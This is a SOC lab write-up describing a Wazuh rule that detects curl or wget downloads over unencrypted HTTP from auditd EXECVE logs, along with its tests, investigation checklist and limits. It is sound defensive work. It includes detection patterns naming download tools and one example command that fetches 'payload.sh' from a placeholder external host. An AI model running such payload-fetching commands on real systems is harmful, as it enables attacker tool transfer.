# Suspicious HTTP Download

## Overview

This scenario demonstrates the detection of potentially suspicious HTTP download activity from a Linux endpoint using command-line utilities such as `curl` and `wget`.

The detection is based on Linux `auditd` `EXECVE` telemetry collected by the Wazuh Agent and processed by the Wazuh Manager.

The scenario focuses on identifying the use of `curl` or `wget` with an unencrypted `http://` URL while avoiding alerts for HTTPS connections.

---

## Objective

Detect command-line download attempts using:

* `curl http://...`
* `curl -L http://...`
* `wget http://...`

while avoiding alerts for equivalent HTTPS requests.

The objective is not to classify every use of `curl` or `wget` as malicious, but to identify a potentially interesting behavior that can be investigated in a SOC environment.

---

## Hypothesis

An attacker may use command-line utilities such as `curl` or `wget` to retrieve tools, scripts or other resources on a compromised Linux endpoint.

The use of an unencrypted HTTP connection can be a useful detection signal because it provides less protection against interception or manipulation than HTTPS.

Therefore:

```text
curl/wget + http://  → potentially suspicious
curl/wget + https:// → informational / no custom alert
```

The detection should be treated as a signal for investigation rather than proof of malicious activity.

## Telemetry

The endpoint uses `auditd` to monitor process execution.

The persistent audit rule used by the laboratory is:

```text
-a always,exit -F arch=b64 -S execve -F auid>=1000 -F auid!=4294967295 -k audit-wazuh-x:execute
```

The resulting events are written to:

```text
/var/log/audit/audit.log
```

For example:

```text
type=EXECVE msg=audit(...): argc=2 a0="curl" a1="http://example.com"
```

Wazuh collects these events through Logcollector and processes them using the built-in auditd decoder.

---

## Decoder

The Wazuh auditd decoder exposes command arguments through structured fields.

Relevant fields include:

```text
audit.execve.a0
audit.execve.a1
audit.execve.a2
...
audit.execve.a7
```

For example:

```text
type=EXECVE ... argc=3 a0="curl" a1="-L" a2="http://example.com"
```

is decoded as:

```text
audit.execve.a0 = curl
audit.execve.a1 = -L
audit.execve.a2 = http://example.com
```

This is important because the URL is not necessarily located in the same argument position for every invocation.

---

## Detection Logic

The custom Wazuh rule uses rule `80700` as the base auditd event and checks two conditions:

1. The executed program is `curl` or `wget`.
2. The event contains `http://`.

The custom rule is:

```xml
<group name="local,network,download,suspicious_activity,">

  <rule id="100300" level="8">
    <if_sid>80700</if_sid>
    <field name="audit.execve.a0" type="pcre2">^(curl|wget)$</field>
    <match type="pcre2">http://</match>
    <description>Local: HTTP download attempted using curl or wget.</description>
    <group>network,download,suspicious_activity,</group>
  </rule>

</group>
```

The rule is maintained in:

```text
detection-rules/suspicious-http-download.xml
```

### Why use `<match>` for the URL?

An initial version checked the URL specifically in `audit.execve.a1`.

This worked for:

```text
curl http://example.com
```

but failed when additional arguments were present:

```text
curl -L http://example.com
```

because the URL was stored in `audit.execve.a2`.

The final rule therefore checks the complete event for `http://` while restricting the executable itself to `curl` or `wget`.

This allows the detection to cover different argument positions without creating multiple rules for each possible command-line layout.

## Validation

The rule was first validated using `wazuh-logtest` and then tested against live telemetry generated by `soc-server`.

### Positive Tests

| Command                      | Expected Result | Result |
| ---------------------------- | --------------- | ------ |
| `curl http://example.com`    | Rule `100300`   | Pass   |
| `curl -L http://example.com` | Rule `100300`   | Pass   |
| `wget http://example.com`    | Rule `100300`   | Pass   |

### Negative Test

| Command                    | Expected Result   | Result |
| -------------------------- | ----------------- | ------ |
| `curl https://example.com` | No `100300` alert | Pass   |

The HTTPS test still produces the normal auditd base rule:

```text
80700 — Audit: Messages grouped.
```

but does not trigger the custom `100300` detection rule.

This confirms that the detection is specifically looking for HTTP usage rather than simply alerting whenever `curl` is executed.

The complete detection path is:

        |
        v

        |
        v

        |
        v

        |

  auditd decoder

   Rule 100300
        |

        |
        v

## Investigation Considerations

An alert from this rule should not automatically be considered malicious.

The following context should be investigated:

* Executing user.
* Full command line.
* URL and destination.
* Parent process.
* Process ancestry.
* Working directory.
* Whether the command was executed interactively or by another process.
* Whether a file was subsequently created.
* File name and location.
* File hash.
* Network destination and reputation.
* Related authentication events.
* Other alerts generated around the same time.

For example, the following command:

```text
curl http://example.com
```

could be completely legitimate in some environments.

However, a command such as:

```text
curl http://<external-host>/payload.sh -o /tmp/payload.sh
```

executed by an unexpected user or spawned by a suspicious process would provide significantly more context for investigation.

## MITRE ATT&CK

### T1105 — Ingress Tool Transfer

This scenario is mapped to:

**T1105 — Ingress Tool Transfer**

The technique covers the transfer of tools or files into a compromised environment. Command-line utilities such as `curl` and `wget` can be used to retrieve files from remote systems.

The detection implemented in this scenario is a behavioral signal related to this technique. It does not establish that a tool was successfully transferred or that the activity was malicious.

## Limitations

This detection has several limitations:

* It detects command execution rather than confirmed file downloads.
* It does not determine whether the downloaded content is malicious.
* It does not inspect the contents of the transferred resource.
* It may generate false positives when HTTP is legitimately used.
* It only covers `curl` and `wget`.
* It relies on auditd process execution telemetry.
* The current detection does not inspect the destination IP, domain reputation or downloaded file.

A stronger detection could correlate the command execution with subsequent file creation, network telemetry or file analysis.
